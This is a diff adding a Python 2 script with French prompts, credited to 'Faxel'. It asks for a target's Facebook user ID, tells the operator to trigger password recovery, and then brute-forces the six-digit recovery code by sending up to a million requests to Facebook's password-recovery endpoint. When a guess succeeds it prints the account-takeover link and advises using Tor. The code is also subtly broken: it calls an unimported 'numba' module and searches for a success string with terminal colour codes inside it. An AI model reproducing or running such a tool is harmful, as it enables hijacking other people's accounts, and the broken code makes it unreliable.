@@ -1,0 +1,61 @@
+#!/usr/bin/python2
+#coding=utf-8
+
+import base64
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize,fileinput
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+from time import sleep   
+from urllib2 import *
+from platform import system
+import urllib
+import httplib
+
+
+os.system('clear')
+print "[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬\033[1;32m▬▬▬▬๑۩۩๑▬▬▬▬▬▬●"             
+print "[38;5;214m•_  _ ____ \033[1;97m _  _ ____ ____ _  _\033[1;32m ____ ____   _  _• "
+print "[38;5;214m•|\/| |__/ \033[1;97m |__| |__| |    |_/ \033[1;32m |___ |__/   |_/ • "
+print "[38;5;214m•|  | |  \ \033[1;97m |  | |  | |___ | \_\033[1;32m |___ |  \ __| \_• "   
+print "[38;5;214m●▬▬▬▬▬▬▬▬๑\033[1;97m●▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬●●▬▬▬▬▬\033[1;32m▬▬▬▬๑۩۩๑▬▬▬▬▬▬●"
+print("\033[1;97m╔═══════════════════════════════════╗")
+print("\033[1;97m║\033[1;91m[\033[1;93m**\033[1;91m]\033[38;5;95m      Developpeur \033[1;97m:\033[38;5;214m  Faxel           \033[1;91m[\033[1;93m**\033[1;91m]\033[1;97m║")
+print("\033[1;97m╚═══════════════════════════════════╝")
+print("")
+print ("\033[1;91mLISEZ EN PREMIER LISEZ-MOI\n")
+print ("\033[1;97mVous devez declencher la recuperation du mot de passe a \033[1;93mhttps://www.facebook.com/login/identify/?ctx=recover \n")
+connection = httplib.HTTPSConnection("www.facebook.com", 443)
+user = raw_input("\033[1;97mEntrer ID numerique de l\'utilisateur \033[1;91m: \033[1;96m")
+
+headers={"Host":"www.facebook.com", "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0", "Accept-Language": "en-US, en"}
+
+code = ['0', '0', '0', '0', '0', '0']
+index = [0, 0, 0, 0, 0, 0]
+rain = 0
+count = 0
+cs = "0123456789"
+
+print ("\033[1;94mUn million de code de recuperation a tester\n")
+for index[0] in range(10):
+        for index[1] in range(10):
+                for index[2] in range(10):
+                        for index[3] in range(10):
+                                for index[4] in range(10):
+                                        for index[5] in numba.prange(10):
+                                                #Qu il pleuve rain!#############################
+                                                for x in range(6):                        #
+                                                        code[x] = cs[(index[x]+rain)%10]  #
+                                                        rain += x+1                       #
+                                                rain -= (1+2+3+4+5+6)-2                   #
+                                                ###########################################
+                                                query = urllib.urlencode({"u":"%s" % user, "n":"%c%c%c%c%c%c" % (code[0], code[1], code[2], code[3], code[4], code[5])})
+                                                if count % 1000 == 0:
+                                                        print "%f%% done" % (float(count)*100.0/1000000.0)
+                                                connection.request('GET', "/recover/password/?%s" % query, headers=headers)
+                                                answer = connection.getresponse()
+                                                if answer.read().find("\033[1;95mChoisissez un nouveau mot de passe\033[1;91m") >= 0:
+                                                        print "\033[1;91m!!!!\033[1;97mUTILISER \033[1;96mTOR\033[1;91m !!!!\033[1;97m\nLe lien est\033[1;92m https://www.facebook.com/recover/password/?u=%s&n=%s&s=23&exp_locale=en_US&redirect_from=button" % (user, code)
+                                                        exit(0)
+                                                count += 1
+    
